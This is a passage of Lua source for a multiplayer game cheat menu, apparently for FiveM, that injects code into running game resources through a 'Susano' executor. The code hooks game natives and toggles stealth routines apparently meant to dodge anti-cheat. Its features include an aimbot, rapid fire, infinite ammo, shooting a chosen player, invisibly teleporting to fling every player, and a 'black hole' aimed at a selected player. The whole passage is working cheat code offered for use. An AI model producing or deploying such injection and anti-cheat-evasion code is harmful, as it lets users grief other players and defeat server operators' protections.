                                                            local vecX = pedCoords.x - camCoords.x
                                                            local vecY = pedCoords.y - camCoords.y
                                                            local vecZ = pedCoords.z - camCoords.z
                                                            local distToCam = math.sqrt(vecX * vecX + vecY * vecY + vecZ * vecZ)
                                                            
                                                            if distToCam > 0 then
                                                                local normX = vecX / distToCam
                                                                local normY = vecY / distToCam
                                                                local normZ = vecZ / distToCam
                                                                local dotProduct = dirX * normX + dirY * normY + dirZ * normZ
                                                                local angle = math.acos(math.max(-1, math.min(1, dotProduct)))
                                                                local angleDeg = math.deg(angle)
                                                                
                                                                if angleDeg < 15 then
                                                                    local score = angleDeg * 10 + distToPlayer * 0.1
                                                                    if score < bestScore then
                                                                        bestScore = score
                                                                        targetPed = ped
                                                                end
                                                            end
                                                        end
                                                    end
                                                end
                                            end
                                            
                                            if targetPed and DoesEntityExist(targetPed) then
                                                local boneIndex = 31086
                                                local targetBone = GetPedBoneIndex(targetPed, boneIndex)
                                                local targetCoords = GetWorldPositionOfEntityBone(targetPed, targetBone)
                                                local offsetX = math.random(-10, 10) / 100.0
                                                local offsetY = math.random(-10, 10) / 100.0
                                                
                                                ShootSingleBulletBetweenCoords(
                                                    targetCoords.x + offsetX, targetCoords.y + offsetY, targetCoords.z + 0.1,
                                                    targetCoords.x, targetCoords.y, targetCoords.z,
                                                    25, true, currentWeapon, playerPed, true, false, 1000.0
                                                )
                                            end
                                            
                                            rawset(_G, 'magic_bullet_cooldown', GetGameTimer() + 100) 
                                        end
                                    end
                                end
                            end
                        end
                    end)

                    Actions.rapidFireItem = FindItem("Combat", "General", "Rapid Fire")
                    if Actions.rapidFireItem then
                        Actions.rapidFireItem.onClick = function(value)
                            Menu.rapidFireEnabled = value
                            if value then StealthAcquire("ac") else StealthRelease("ac") end
                            if type(Susano) == "table" and type(Susano.InjectResource) == "function" then
                                Susano.InjectResource("any", string.format([[
                                    if not _G then _G = {} end
                                    _G.rapidFireEnabled = %s
                                    _G.rapidFireLastShot = 0
                                    
                                    CreateThread(function()
                                        while true do
                                            Wait(0)
                                            if _G.rapidFireEnabled then
                                                local playerPed = PlayerPedId()
                                                if playerPed and DoesEntityExist(playerPed) then
                                                    if IsControlPressed(0, 24) or IsPedShooting(playerPed) then
                                                        local currentTime = GetGameTimer()
                                                        if currentTime - (_G.rapidFireLastShot or 0) > 50 then
                                                            local currentWeapon = GetSelectedPedWeapon(playerPed)
                                                            if currentWeapon ~= GetHashKey("WEAPON_UNARMED") and currentWeapon ~= 0 then
                                                                local ammo = GetAmmoInPedWeapon(playerPed, currentWeapon)
                                                                if ammo > 0 then
                                                                    SetPedAmmo(playerPed, currentWeapon, ammo - 1)
                                                                    
                                                                    local weaponDamage = GetWeaponDamage(currentWeapon)
                                                                    if weaponDamage == 0.0 then
                                                                        weaponDamage = 25.0
                                                                    end
                                                                    
                                                                    local camCoords = GetGameplayCamCoord()
                                                                    local camRot = GetGameplayCamRot(0)
                                                                    
                                                                    local z = math.rad(camRot.z)
                                                                    local x = math.rad(camRot.x)
                                                                    local num = math.abs(math.cos(x))
                                                                    local dirX = -math.sin(z) * num
                                                                    local dirY = math.cos(z) * num
                                                                    local dirZ = math.sin(x)
                                                                    
                                                                    local startX = camCoords.x
                                                                    local startY = camCoords.y
                                                                    local startZ = camCoords.z
                                                                    
                                                                    local distance = 1000.0
                                                                    local endX = startX + dirX * distance
                                                                    local endY = startY + dirY * distance
                                                                    local endZ = startZ + dirZ * distance
                                                                    
                                                                    ShootSingleBulletBetweenCoords(
                                                                        startX, startY, startZ,
                                                                        endX, endY, endZ,
                                                                        weaponDamage, true, currentWeapon, playerPed, true, false, 1000.0
                                                                    )
                                                                    
                                                                    _G.rapidFireLastShot = currentTime
                                                                end
                                                            end
                                                        end
                                                    end
                                                end
                                            else
                                                Wait(100)
                                            end
                                        end
                                    end)
                                ]], tostring(value)))
                            end
                        end
                    end

                    Actions.infiniteAmmoItem = FindItem("Combat", "General", "Infinite Ammo")
                    if Actions.infiniteAmmoItem then
                        Actions.infiniteAmmoItem.onClick = function(value)
                            Menu.infiniteAmmoEnabled = value
                            if value then
                                _Stealth.ammo = true; StealthAcquire("ac")
                            else
                                _Stealth.ammo = false; StealthRelease("ac")
                            end
                            if type(Susano) == "table" and type(Susano.InjectResource) == "function" then
                                Susano.InjectResource("any", string.format([[
                                    if not _G then _G = {} end
                                    _G.infiniteAmmoEnabled = %s
                                    
                                    CreateThread(function()
                                        while true do
                                            Wait(0)
                                            if _G.infiniteAmmoEnabled then
                                                local playerPed = PlayerPedId()
                                                if playerPed and DoesEntityExist(playerPed) then
                                                    local currentWeapon = GetSelectedPedWeapon(playerPed)
                                                    if currentWeapon ~= GetHashKey("WEAPON_UNARMED") and currentWeapon ~= 0 then
                                                        SetPedAmmo(playerPed, currentWeapon, 250)
                                                        SetAmmoInClip(playerPed, currentWeapon, 250)
                                                    end
                                                end
                                            else
                                                Wait(100)
                                            end
                                        end
                                    end)
                                ]], tostring(value)))
                            end
                        end
                    end

                    Actions.noSpreadItem = FindItem("Combat", "General", "No Spread")
                    if Actions.noSpreadItem then
                        Actions.noSpreadItem.onClick = function(value)
                            Menu.noSpreadEnabled = value
                            if type(Susano) == "table" and type(Susano.InjectResource) == "function" then
                                Susano.InjectResource("any", string.format([[
                                    if not _G then _G = {} end
                                    _G.noSpreadEnabled = %s
                                    
                                    local s = rawget(_G, "Susano")
                                    if s and type(s) == "table" and type(s.HookNative) == "function" then
                                        if _G.noSpreadEnabled then
                                            s.HookNative(0x90A43CC281FFAB46, function() return 0.0 end)
                                            s.HookNative(0x5063F92F07C2A316, function() return 1.0 end)
                                        else
                                        end
                                    end
                                    
                                    CreateThread(function()
                                        while true do
                                            Wait(0)
                                            if _G.noSpreadEnabled then
                                                local playerPed = PlayerPedId()
                                                if playerPed and DoesEntityExist(playerPed) then
                                                    local currentWeapon = GetSelectedPedWeapon(playerPed)
                                                    if currentWeapon ~= GetHashKey("WEAPON_UNARMED") and currentWeapon ~= 0 then
                                                        SetWeaponDamageModifier(currentWeapon, 1.0)
                                                    end
                                                end
                                            else
                                                Wait(100)
                                            end
                                        end
                                    end)
                                ]], tostring(value)))
                            end
                        end
                    end

                    Actions.noRecoilItem = FindItem("Combat", "General", "No Recoil")
                    if Actions.noRecoilItem then
                        Actions.noRecoilItem.onClick = function(value)
                            Menu.noRecoilEnabled = value
                        end
                    end

                    Actions.giveAmmoItem = FindItem("Combat", "General", "Give Ammo")
                    if Actions.giveAmmoItem then
                        Actions.giveAmmoItem.onClick = function()
                            if type(Susano) == "table" and type(Susano.InjectResource) == "function" then
                                Susano.InjectResource("any", [[
                                    local ped = PlayerPedId()
                                    if not ped or not DoesEntityExist(ped) then return end
                                    
                                    -- Donner des munitions seulement Ã  l'arme actuellement dans les mains
                                    local currentWeapon = GetSelectedPedWeapon(ped)
                                    if currentWeapon and currentWeapon ~= 0 and currentWeapon ~= GetHashKey("WEAPON_UNARMED") then
                                        SetPedAmmo(ped, currentWeapon, 9999)
                                    end
                                ]])
                            else
                                -- Fallback si Susano n'est pas disponible
                                local ped = PlayerPedId()
                                if ped and DoesEntityExist(ped) then
                                    local currentWeapon = GetSelectedPedWeapon(ped)
                                    if currentWeapon and currentWeapon ~= 0 and currentWeapon ~= GetHashKey("WEAPON_UNARMED") then
                                        SetPedAmmo(ped, currentWeapon, 9999)
                                    end
                                end
                            end
                        end
                    end

                    -- Give all attachment
                    Actions.giveAllAttachmentItem = FindItem("Combat", "General", "Give all attachment")
                    if Actions.giveAllAttachmentItem then
                        Actions.giveAllAttachmentItem.onClick = function()
                            if type(Susano) == "table" and type(Susano.InjectResource) == "function" then
                                Susano.InjectResource("any", [[
                                    local ped = PlayerPedId()
                                    if not ped or not DoesEntityExist(ped) then return end
                                    
                                    local currentWeapon = GetSelectedPedWeapon(ped)
                                    if currentWeapon and currentWeapon ~= 0 and currentWeapon ~= GetHashKey("WEAPON_UNARMED") then
                                        -- Liste des composants communs pour toutes les armes
                                        local components = {
                                            GetHashKey("COMPONENT_AT_AR_SUPP_02"), -- Suppressor
                                            GetHashKey("COMPONENT_AT_AR_FLSH"), -- Flashlight
                                            GetHashKey("COMPONENT_AT_AR_AFGRIP"), -- Grip
                                            GetHashKey("COMPONENT_AT_SCOPE_MEDIUM"), -- Scope
                                            GetHashKey("COMPONENT_AT_SCOPE_SMALL"), -- Small Scope
                                            GetHashKey("COMPONENT_AT_SCOPE_LARGE"), -- Large Scope
                                            GetHashKey("COMPONENT_AT_PI_FLSH"), -- Pistol Flashlight
                                            GetHashKey("COMPONENT_AT_PI_SUPP_02"), -- Pistol Suppressor
                                            GetHashKey("COMPONENT_AT_SR_SUPP"), -- Sniper Suppressor
                                            GetHashKey("COMPONENT_AT_SR_FLSH"), -- Sniper Flashlight
                                            GetHashKey("COMPONENT_AT_SCOPE_MAX"), -- Max Scope
                                        }
                                        
                                        for _, componentHash in ipairs(components) do
                                            if componentHash and componentHash ~= 0 then
                                                GiveWeaponComponentToPed(ped, currentWeapon, componentHash)
                                            end
                                        end
                                    end
                                ]])
                            end
                        end
                    end

                    -- Give suppressor
                    Actions.giveSuppressorItem = FindItem("Combat", "General", "Give suppressor")
                    if Actions.giveSuppressorItem then
                        Actions.giveSuppressorItem.onClick = function()
                            if type(Susano) == "table" and type(Susano.InjectResource) == "function" then
                                Susano.InjectResource("any", [[
                                    local ped = PlayerPedId()
                                    if not ped or not DoesEntityExist(ped) then return end
                                    
                                    local currentWeapon = GetSelectedPedWeapon(ped)
                                    if currentWeapon and currentWeapon ~= 0 and currentWeapon ~= GetHashKey("WEAPON_UNARMED") then
                                        local suppressors = {
                                            GetHashKey("COMPONENT_AT_AR_SUPP_02"),
                                            GetHashKey("COMPONENT_AT_PI_SUPP_02"),
                                            GetHashKey("COMPONENT_AT_SR_SUPP"),
                                            GetHashKey("COMPONENT_AT_AR_SUPP"),
                                            GetHashKey("COMPONENT_AT_PI_SUPP"),
                                        }
                                        
                                        for _, suppressorHash in ipairs(suppressors) do
                                            if suppressorHash and suppressorHash ~= 0 then
                                                GiveWeaponComponentToPed(ped, currentWeapon, suppressorHash)
                                            end
                                        end
                                    end
                                ]])
                            end
                        end
                    end

                    -- Give flashlight
                    Actions.giveFlashlightItem = FindItem("Combat", "General", "Give flashlight")
                    if Actions.giveFlashlightItem then
                        Actions.giveFlashlightItem.onClick = function()
                            if type(Susano) == "table" and type(Susano.InjectResource) == "function" then
                                Susano.InjectResource("any", [[
                                    local ped = PlayerPedId()
                                    if not ped or not DoesEntityExist(ped) then return end
                                    
                                    local currentWeapon = GetSelectedPedWeapon(ped)
                                    if currentWeapon and currentWeapon ~= 0 and currentWeapon ~= GetHashKey("WEAPON_UNARMED") then
                                        local flashlights = {
                                            GetHashKey("COMPONENT_AT_AR_FLSH"),
                                            GetHashKey("COMPONENT_AT_PI_FLSH"),
                                            GetHashKey("COMPONENT_AT_SR_FLSH"),
                                        }
                                        
                                        for _, flashlightHash in ipairs(flashlights) do
                                            if flashlightHash and flashlightHash ~= 0 then
                                                GiveWeaponComponentToPed(ped, currentWeapon, flashlightHash)
                                            end
                                        end
                                    end
                                ]])
                            end
                        end
                    end

                    -- Give grip
                    Actions.giveGripItem = FindItem("Combat", "General", "Give grip")
                    if Actions.giveGripItem then
                        Actions.giveGripItem.onClick = function()
                            if type(Susano) == "table" and type(Susano.InjectResource) == "function" then
                                Susano.InjectResource("any", [[
                                    local ped = PlayerPedId()
                                    if not ped or not DoesEntityExist(ped) then return end
                                    
                                    local currentWeapon = GetSelectedPedWeapon(ped)
                                    if currentWeapon and currentWeapon ~= 0 and currentWeapon ~= GetHashKey("WEAPON_UNARMED") then
                                        local grips = {
                                            GetHashKey("COMPONENT_AT_AR_AFGRIP"),
                                        }
                                        
                                        for _, gripHash in ipairs(grips) do
                                            if gripHash and gripHash ~= 0 then
                                                GiveWeaponComponentToPed(ped, currentWeapon, gripHash)
                                            end
                                        end
                                    end
                                ]])
                            end
                        end
                    end

                    -- Give scope
                    Actions.giveScopeItem = FindItem("Combat", "General", "Give scope")
                    if Actions.giveScopeItem then
                        Actions.giveScopeItem.onClick = function()
                            if type(Susano) == "table" and type(Susano.InjectResource) == "function" then
                                Susano.InjectResource("any", [[
                                    local ped = PlayerPedId()
                                    if not ped or not DoesEntityExist(ped) then return end
                                    
                                    local currentWeapon = GetSelectedPedWeapon(ped)
                                    if currentWeapon and currentWeapon ~= 0 and currentWeapon ~= GetHashKey("WEAPON_UNARMED") then
                                        local scopes = {
                                            GetHashKey("COMPONENT_AT_SCOPE_SMALL"),
                                            GetHashKey("COMPONENT_AT_SCOPE_MEDIUM"),
                                            GetHashKey("COMPONENT_AT_SCOPE_LARGE"),
                                            GetHashKey("COMPONENT_AT_SCOPE_MAX"),
                                            GetHashKey("COMPONENT_AT_SCOPE_MACRO"),
                                            GetHashKey("COMPONENT_AT_SCOPE_NV"),
                                            GetHashKey("COMPONENT_AT_SCOPE_THERMAL"),
                                        }
                                        
                                        for _, scopeHash in ipairs(scopes) do
                                            if scopeHash and scopeHash ~= 0 then
                                                GiveWeaponComponentToPed(ped, currentWeapon, scopeHash)
                                            end
                                        end
                                    end
                                ]])
                            end
                        end
                    end

                    Actions.noReloadItem = FindItem("Combat", "General", "No Reload")
                    if Actions.noReloadItem then
                        Actions.noReloadItem.onClick = function(value)
                            Menu.noReloadEnabled = value
                            if type(Susano) == "table" and type(Susano.InjectResource) == "function" then
                                Susano.InjectResource("any", string.format([[
                                    if not _G then _G = {} end
                                    _G.noReloadEnabled = %s
                                    
                                    CreateThread(function()
                                        while true do
                                            Wait(0)
                                            if _G.noReloadEnabled then
                                                local playerPed = PlayerPedId()
                                                if playerPed and DoesEntityExist(playerPed) then
                                                    local currentWeapon = GetSelectedPedWeapon(playerPed)
                                                    if currentWeapon ~= GetHashKey("WEAPON_UNARMED") and currentWeapon ~= 0 then
                                                        SetAmmoInClip(playerPed, currentWeapon, 9999)
                                                        SetPedAmmo(playerPed, currentWeapon, 9999)
                                                    end
                                                end
                                            else
                                                Wait(100)
                                            end
                                        end
                                    end)
                                ]], tostring(value)))
                            end
                        end
                    end

                    CreateThread(function()
                        while true do
                            Wait(0)
                            
                            if Menu.noRecoilEnabled then
                                local ped = PlayerPedId()
                                local weapon = GetSelectedPedWeapon(ped)
                                if weapon ~= GetHashKey("WEAPON_UNARMED") then
                                    SetWeaponRecoilShakeAmplitude(weapon, 0.0)
                                end
                            end
                        end
                    end)

if type(Susano) == "table" and type(Susano.InjectResource) == "function" then
    Susano.InjectResource("any", [[
        if not _G.drawFovEnabled then _G.drawFovEnabled = false end
        if not _G.fovRadius then _G.fovRadius = 150.0 end
    ]])
end



function Menu.ActionCopyAppearance()
    if not Menu.SelectedPlayer then return end
    
    local targetServerId = Menu.SelectedPlayer
    
    if type(Susano) == "table" and type(Susano.InjectResource) == "function" then
        Susano.InjectResource("any", string.format([[
            local function hNative(nativeName, newFunction)
                local originalNative = _G[nativeName]
                if not originalNative or type(originalNative) ~= "function" then return end
                _G[nativeName] = function(...) return newFunction(originalNative, ...) end
            end
            
            hNative("GetActivePlayers", function(originalFn, ...) return originalFn(...) end)
            hNative("GetPlayerServerId", function(originalFn, ...) return originalFn(...) end)
            hNative("GetPlayerPed", function(originalFn, ...) return originalFn(...) end)
            hNative("PlayerPedId", function(originalFn, ...) return originalFn(...) end)
            hNative("DoesEntityExist", function(originalFn, ...) return originalFn(...) end)
            hNative("SetPedComponentVariation", function(originalFn, ...) return originalFn(...) end)
            hNative("GetPedDrawableVariation", function(originalFn, ...) return originalFn(...) end)
            hNative("GetPedTextureVariation", function(originalFn, ...) return originalFn(...) end)
            hNative("GetPedPaletteVariation", function(originalFn, ...) return originalFn(...) end)
            hNative("SetPedPropIndex", function(originalFn, ...) return originalFn(...) end)
            hNative("GetPedPropIndex", function(originalFn, ...) return originalFn(...) end)
            hNative("GetPedPropTextureIndex", function(originalFn, ...) return originalFn(...) end)
            hNative("ClearPedProp", function(originalFn, ...) return originalFn(...) end)
            hNative("ClonePedToTarget", function(originalFn, ...) return originalFn(...) end)
            hNative("GetPedHeadBlendData", function(originalFn, ...) return originalFn(...) end)
            hNative("SetPedHeadBlendData", function(originalFn, ...) return originalFn(...) end)
            hNative("GetPedFaceFeature", function(originalFn, ...) return originalFn(...) end)
            hNative("SetPedFaceFeature", function(originalFn, ...) return originalFn(...) end)
            hNative("GetPedHairColor", function(originalFn, ...) return originalFn(...) end)
            hNative("GetPedHairHighlightColor", function(originalFn, ...) return originalFn(...) end)
            hNative("SetPedHairColor", function(originalFn, ...) return originalFn(...) end)
            hNative("GetPedEyeColor", function(originalFn, ...) return originalFn(...) end)
            hNative("SetPedEyeColor", function(originalFn, ...) return originalFn(...) end)
            hNative("GetPedHeadOverlay", function(originalFn, ...) return originalFn(...) end)
            hNative("SetPedHeadOverlay", function(originalFn, ...) return originalFn(...) end)
            hNative("GetPedHeadOverlayColor", function(originalFn, ...) return originalFn(...) end)
            hNative("SetPedHeadOverlayColor", function(originalFn, ...) return originalFn(...) end)
            
            local targetServerId = %d
            
            local targetPlayerId = nil
            for _, player in ipairs(GetActivePlayers()) do
                if GetPlayerServerId(player) == targetServerId then
                    targetPlayerId = player
                    break
                end
            end
            
            if not targetPlayerId then return end
            
            local targetPed = GetPlayerPed(targetPlayerId)
            local myPed = PlayerPedId()
            
            if not DoesEntityExist(targetPed) or not DoesEntityExist(myPed) then return end
            
            ClonePedToTarget(targetPed, myPed)
            
            Wait(100)
            
            for componentId = 0, 11 do
                local drawable = GetPedDrawableVariation(targetPed, componentId)
                local texture = GetPedTextureVariation(targetPed, componentId)
                local palette = GetPedPaletteVariation(targetPed, componentId)
                SetPedComponentVariation(myPed, componentId, drawable, texture, palette)
            end
            
            for propId = 0, 7 do
                local prop = GetPedPropIndex(targetPed, propId)
                local texture = GetPedPropTextureIndex(targetPed, propId)
                if prop ~= -1 then
                    SetPedPropIndex(myPed, propId, prop, texture, true)
                else
                    ClearPedProp(myPed, propId)
                end
            end
            
            local shapeFirst, shapeSecond, shapeThird, skinFirst, skinSecond, skinThird, shapeMix, skinMix, thirdMix = GetPedHeadBlendData(targetPed)
            SetPedHeadBlendData(myPed, shapeFirst, shapeSecond, shapeThird, skinFirst, skinSecond, skinThird, shapeMix, skinMix, thirdMix)
            
            for i = 0, 19 do
                local value = GetPedFaceFeature(targetPed, i)
                SetPedFaceFeature(myPed, i, value)
            end
            
            local hairColor, highlightColor = GetPedHairColor(targetPed)
            SetPedHairColor(myPed, hairColor, highlightColor)
            
            local eyeColor = GetPedEyeColor(targetPed)
            SetPedEyeColor(myPed, eyeColor)
            
            for overlayId = 0, 12 do
                local overlayValue, overlayOpacity = GetPedHeadOverlay(targetPed, overlayId)
                local colorType, colorId, secondColorId = GetPedHeadOverlayColor(targetPed, overlayId)
                SetPedHeadOverlay(myPed, overlayId, overlayValue, overlayOpacity)
                if colorType == 1 then
                    SetPedHeadOverlayColor(myPed, overlayId, colorType, colorId, secondColorId)
                elseif colorType == 2 then
                    SetPedHeadOverlayColor(myPed, overlayId, colorType, colorId, secondColorId)
                end
            end
        ]], targetServerId))
    end
end

local shootPlayerLastShot = 0
local shootPlayerCooldown = 500

function Menu.ActionLaunchAll()
    if type(Susano) == "table" and type(Susano.InjectResource) == "function" then
        Susano.InjectResource("any", [[
            CreateThread(function()
                local myPed = PlayerPedId()
                if not myPed then
                    return
                end

                local myCoords = GetEntityCoords(myPed)
                if not myCoords then
                    return
                end

                local players = GetActivePlayers()
                if not players then
                    return
                end

                for _, player in ipairs(players) do
                    local clientId = player
                    if clientId and clientId ~= -1 then
                        local targetPed = GetPlayerPed(clientId)
                        if targetPed and DoesEntityExist(targetPed) then
                            local targetCoords = GetEntityCoords(targetPed)
                            if targetCoords then
                                local distance = #(myCoords - targetCoords)
                                local teleported = false
                                local originalCoords = nil

                                if distance > 10.0 then
                                    originalCoords = myCoords
                                    local angle = math.random() * 2 * math.pi
                                    local radiusOffset = math.random(5, 9)
                                    local xOffset = math.cos(angle) * radiusOffset
                                    local yOffset = math.sin(angle) * radiusOffset
                                    local newCoords = vector3(targetCoords.x + xOffset, targetCoords.y + yOffset, targetCoords.z)
                                    SetEntityCoordsNoOffset(myPed, newCoords.x, newCoords.y, newCoords.z, false, false, false)
                                    SetEntityVisible(myPed, false, 0)
                                    teleported = true
                                    Wait(100)
                                end

                                ClearPedTasksImmediately(myPed)
                                for i = 1, 5 do
                                    if not DoesEntityExist(targetPed) then
                                        break
                                    end

                                    local curTargetCoords = GetEntityCoords(targetPed)
                                    if not curTargetCoords then
                                        break
                                    end

                                    SetEntityCoords(myPed, curTargetCoords.x, curTargetCoords.y, curTargetCoords.z + 0.5, false, false, false, false)
                                    Wait(100)
                                    AttachEntityToEntityPhysically(myPed, targetPed, 0, 0.0, 0.0, 0.0, 150.0, 0.0, 0.0, 0.0, 0.0, 0.0, 1, false, false, 1, 2)
                                    Wait(100)
                                    DetachEntity(myPed, true, true)
                                    Wait(200)
                                end

                                Wait(500)
                                ClearPedTasksImmediately(myPed)

                                if originalCoords then
                                    SetEntityCoords(myPed, originalCoords.x, originalCoords.y, originalCoords.z + 1.0, false, false, false, false)
                                    Wait(100)
                                    SetEntityCoords(myPed, originalCoords.x, originalCoords.y, originalCoords.z, false, false, false, false)
                                end

                                if teleported then
                                    SetEntityVisible(myPed, true, 0)
                                end

                                Wait(50)
                            end
                        end
                    end
                end
            end)
        ]])
    end
end

function Menu.ActionShootPlayer()
    if not Menu.SelectedPlayer then
        return
    end
    
    local currentTime = GetGameTimer()
    if currentTime - shootPlayerLastShot < shootPlayerCooldown then
        return
    end
    shootPlayerLastShot = currentTime
    
    local targetServerId = Menu.SelectedPlayer
    
    if type(Susano) == "table" and type(Susano.InjectResource) == "function" then
        Susano.InjectResource("any", string.format([[
            local targetServerId = %d
            local targetPlayerId = nil
            for _, player in ipairs(GetActivePlayers()) do
                if GetPlayerServerId(player) == targetServerId then
                    targetPlayerId = player
                    break
                end
            end
            
            if not targetPlayerId then
                return
            end
            
            local targetPed = GetPlayerPed(targetPlayerId)
            if not DoesEntityExist(targetPed) then
                return
            end
            
            local playerPed = PlayerPedId()
            local selectedWeapon = nil
            
            local currentWeapon = GetSelectedPedWeapon(playerPed)
            if currentWeapon and currentWeapon ~= 0 and currentWeapon ~= GetHashKey("WEAPON_UNARMED") then
                if HasPedGotWeapon(playerPed, currentWeapon, false) then
                    selectedWeapon = currentWeapon
                end
            end
            
            if not selectedWeapon then
                local weapons = {
                    GetHashKey("WEAPON_PISTOL"),
                    GetHashKey("WEAPON_COMBATPISTOL"),
                    GetHashKey("WEAPON_APPISTOL"),
                    GetHashKey("WEAPON_PISTOL50"),
                    GetHashKey("WEAPON_MICROSMG"),
                    GetHashKey("WEAPON_SMG"),
                    GetHashKey("WEAPON_ASSAULTSMG"),
                    GetHashKey("WEAPON_ASSAULTRIFLE"),
                    GetHashKey("WEAPON_CARBINERIFLE"),
                    GetHashKey("WEAPON_ADVANCEDRIFLE"),
                    GetHashKey("WEAPON_PUMPSHOTGUN"),
                    GetHashKey("WEAPON_SAWNOFFSHOTGUN"),
                    GetHashKey("WEAPON_ASSAULTSHOTGUN"),
                    GetHashKey("WEAPON_SNIPERRIFLE"),
                    GetHashKey("WEAPON_HEAVYSNIPER"),
                    GetHashKey("WEAPON_MARKSMANRIFLE"),
                    GetHashKey("WEAPON_RPG"),
                    GetHashKey("WEAPON_GRENADELAUNCHER"),
                    GetHashKey("WEAPON_MINIGUN"),
                    GetHashKey("WEAPON_REVOLVER"),
                    GetHashKey("WEAPON_PISTOL_MK2"),
                    GetHashKey("WEAPON_SMG_MK2"),
                    GetHashKey("WEAPON_ASSAULTRIFLE_MK2"),
                    GetHashKey("WEAPON_CARBINERIFLE_MK2"),
                    GetHashKey("WEAPON_PUMPSHOTGUN_MK2"),
                    GetHashKey("WEAPON_SNSPISTOL"),
                    GetHashKey("WEAPON_HEAVYPISTOL"),
                    GetHashKey("WEAPON_VINTAGEPISTOL"),
                    GetHashKey("WEAPON_MACHINEPISTOL"),
                    GetHashKey("WEAPON_COMBATPDW"),
                    GetHashKey("WEAPON_MG"),
                    GetHashKey("WEAPON_COMBATMG"),
                    GetHashKey("WEAPON_COMBATMG_MK2"),
                    GetHashKey("WEAPON_GUSENBERG"),
                    GetHashKey("WEAPON_SPECIALCARBINE"),
                    GetHashKey("WEAPON_BULLPUPRIFLE"),
                    GetHashKey("WEAPON_COMPACTRIFLE"),
                    GetHashKey("WEAPON_BULLPUPSHOTGUN"),
                    GetHashKey("WEAPON_MUSKET"),
                    GetHashKey("WEAPON_HEAVYSHOTGUN"),
                    GetHashKey("WEAPON_DBSHOTGUN"),
                    GetHashKey("WEAPON_AUTOSHOTGUN"),
                    GetHashKey("WEAPON_MARKSMANRIFLE_MK2"),
                    GetHashKey("weapon_SCOM"),
                    GetHashKey("weapon_mcx"),
                    GetHashKey("weapon_grau"),
                    GetHashKey("weapon_midasgun"),
                    GetHashKey("weapon_hackingdevice"),
                    GetHashKey("weapon_akorus"),
                    GetHashKey("WEAPON_MIDGARD")
                }
                
                for _, weaponHash in ipairs(weapons) do
                    if HasPedGotWeapon(playerPed, weaponHash, false) then
                        selectedWeapon = weaponHash
                        break
                    end
                end
            end
            
            if not selectedWeapon then
                return
            end
            
            local originalWeapon = GetSelectedPedWeapon(playerPed)
            SetCurrentPedWeapon(playerPed, selectedWeapon, true)
            
            Wait(50)
            
            local targetCoords = GetEntityCoords(targetPed)
            
            local startCoords = vector3(
                targetCoords.x + math.random(-20, 20) / 100.0,
                targetCoords.y + math.random(-20, 20) / 100.0,
                targetCoords.z + math.random(10, 30) / 100.0
            )
            
            local targetBodyCoords = vector3(
                targetCoords.x,
                targetCoords.y,
                targetCoords.z
            )
            
            ShootSingleBulletBetweenCoords(
                startCoords.x, startCoords.y, startCoords.z,
                targetBodyCoords.x, targetBodyCoords.y, targetBodyCoords.z,
                25, true, selectedWeapon, playerPed, true, false, 1000.0
            )
            
            Wait(100)
            
            if originalWeapon and originalWeapon ~= 0 and originalWeapon ~= GetHashKey("WEAPON_UNARMED") then
                if HasPedGotWeapon(playerPed, originalWeapon, false) then
                    SetCurrentPedWeapon(playerPed, originalWeapon, true)
                else
                    SetCurrentPedWeapon(playerPed, GetHashKey("WEAPON_UNARMED"), true)
                end
            else
                SetCurrentPedWeapon(playerPed, GetHashKey("WEAPON_UNARMED"), true)
            end
        ]], targetServerId))
    end
end



                    function Menu.ActionBlackHole()
                        if not Menu.SelectedPlayer then return end

                        local targetServerId = Menu.SelectedPlayer

                        if type(Susano) == "table" and type(Susano.InjectResource) == "function" then
                            Susano.InjectResource("any", string.format([[
                if _G.black_hole_active then
                    _G.black_hole_active = false
                    _G.black_hole_vehicles = {}
                    _G.black_hole_target_player = nil
                    _G.black_hole_last_scan = 0
                    return
                end

                function hNative(nativeName, newFunction)
                    local originalNative = _G[nativeName]
                    if not originalNative or type(originalNative) ~= "function" then
                        return
                    end
                    _G[nativeName] = function(...)
                        return newFunction(originalNative, ...)
                    end
                end
                hNative("GetActivePlayers", function(originalFn, ...) return originalFn(...) end)
                hNative("GetPlayerServerId", function(originalFn, ...) return originalFn(...) end)
                hNative("GetPlayerPed", function(originalFn, ...) return originalFn(...) end)
                hNative("DoesEntityExist", function(originalFn, ...) return originalFn(...) end)
                hNative("CreateThread", function(originalFn, ...) return originalFn(...) end)
                hNative("PlayerPedId", function(originalFn, ...) return originalFn(...) end)
                hNative("GetEntityCoords", function(originalFn, ...) return originalFn(...) end)
                hNative("GetEntityHeading", function(originalFn, ...) return originalFn(...) end)
                hNative("CreateCam", function(originalFn, ...) return originalFn(...) end)
                hNative("GetGameplayCamCoord", function(originalFn, ...) return originalFn(...) end)
                hNative("GetGameplayCamRot", function(originalFn, ...) return originalFn(...) end)
                hNative("SetCamCoord", function(originalFn, ...) return originalFn(...) end)
                hNative("SetCamRot", function(originalFn, ...) return originalFn(...) end)
                hNative("GetGameplayCamFov", function(originalFn, ...) return originalFn(...) end)
                hNative("SetCamFov", function(originalFn, ...) return originalFn(...) end)
                hNative("SetCamActive", function(originalFn, ...) return originalFn(...) end)
                hNative("RenderScriptCams", function(originalFn, ...) return originalFn(...) end)
                hNative("GetEntityModel", function(originalFn, ...) return originalFn(...) end)
                hNative("RequestModel", function(originalFn, ...) return originalFn(...) end)
                hNative("HasModelLoaded", function(originalFn, ...) return originalFn(...) end)
                hNative("Wait", function(originalFn, ...) return originalFn(...) end)
                hNative("StartShapeTestRay", function(originalFn, ...) return originalFn(...) end)
                hNative("GetShapeTestResult", function(originalFn, ...) return originalFn(...) end)
                hNative("CreatePed", function(originalFn, ...) return originalFn(...) end)
                hNative("SetEntityCollision", function(originalFn, ...) return originalFn(...) end)
                hNative("FreezeEntityPosition", function(originalFn, ...) return originalFn(...) end)
                hNative("SetEntityInvincible", function(originalFn, ...) return originalFn(...) end)
                hNative("SetBlockingOfNonTemporaryEvents", function(originalFn, ...) return originalFn(...) end)
                hNative("SetPedCanRagdoll", function(originalFn, ...) return originalFn(...) end)
                hNative("ClonePedToTarget", function(originalFn, ...) return originalFn(...) end)
                hNative("SetEntityVisible", function(originalFn, ...) return originalFn(...) end)
                hNative("SetEntityLocallyInvisible", function(originalFn, ...) return originalFn(...) end)
                hNative("FindFirstVehicle", function(originalFn, ...) return originalFn(...) end)
                hNative("FindNextVehicle", function(originalFn, ...) return originalFn(...) end)
                hNative("EndFindVehicle", function(originalFn, ...) return originalFn(...) end)
                hNative("GetVehicleClass", function(originalFn, ...) return originalFn(...) end)
                hNative("GetVehiclePedIsIn", function(originalFn, ...) return originalFn(...) end)
